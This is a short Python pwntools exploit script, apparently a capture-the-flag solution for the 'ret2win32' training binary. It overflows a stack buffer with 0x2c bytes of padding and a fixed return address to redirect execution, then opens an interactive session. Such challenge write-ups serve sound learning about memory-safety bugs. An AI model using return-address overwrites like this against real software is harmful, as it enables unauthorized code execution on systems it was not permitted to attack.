from pwn import *

r = process('./ret2win32')

offset = 0x2c
payload = 'a' * offset + p32(0x08048659)

r.recv()
r.send(payload)

r.interactive()
